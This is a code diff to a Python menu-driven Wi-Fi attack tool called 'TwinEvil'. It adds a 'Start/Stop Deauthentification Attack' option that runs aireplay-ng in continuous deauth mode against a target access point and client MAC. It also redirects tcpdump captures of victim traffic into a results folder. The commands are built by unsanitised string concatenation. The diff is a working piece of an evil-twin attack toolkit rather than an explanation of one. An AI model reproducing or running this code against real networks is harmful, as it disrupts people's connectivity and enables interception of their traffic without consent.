@@ -35,7 +35,7 @@ def displayMenu():
 		print("Capture Packets : ", '\x1b[0;37;41m' + settings.globals["capture"] + '\x1b[0m', "\n")
 	else:
 		print("Capture Packets : ", '\x1b[6;30;42m' + settings.globals["capture"] + '\x1b[0m', "\n")	
-	options = ["Select Interfaces", "Select WIFI target to clone", "Lauch TwinEvil", "Deauthentification", "Start/Stop Packets capture", "Exit"]
+	options = ["Select Interfaces", "Select WIFI target to clone", "Lauch TwinEvil", "Deauthentification Setup", "Start/Stop Packets capture", "Start/Stop Deauthentification Attack", "Exit"]
 	terminal_menu = TerminalMenu(options)
 	menu_entry_index = terminal_menu.show()
 	match menu_entry_index:
@@ -50,6 +50,8 @@ def displayMenu():
 		case 4:
 			capturePackets(settings.globals["interfaceAP"])
 		case 5:
+			deauthAttack(settings.globals["interfaceAP"], settings.globals["bssid"], settings.globals["deviceMAC"])
+		case 6:
 			return False
 	return True
 
@@ -166,8 +168,13 @@ def startTwin():
 def capturePackets(wlan):
 	if settings.globals["capture"] == 'OFF':
 		settings.globals["capture"] = 'ON'
-		call(["gnome-terminal", "-x", "sh", "-c", "tcpdump -i " + wlan + " -s 65535 -w dataCaptured.pcap; bash"])
+		call(["gnome-terminal", "-x", "sh", "-c", "tcpdump -i " + wlan + " -s 65535 -w res/tcpDump/dataCaptured.pcap; bash"])
 	else:
 		settings.globals["capture"] = 'OFF'
 		shell("pkill tcpdump")
 
+def deauthAttack(wlan, bssid, deviceMAC):
+	if settings.globals["deviceMAC"] is not None:
+		call(["gnome-terminal", "-x", "sh", "-c", "aireplay-ng -0 0 -a " + bssid + "  -c " + deviceMAC + ' ' + wlan + "; bash"])
+	else:
+		shell("pkill airodump")
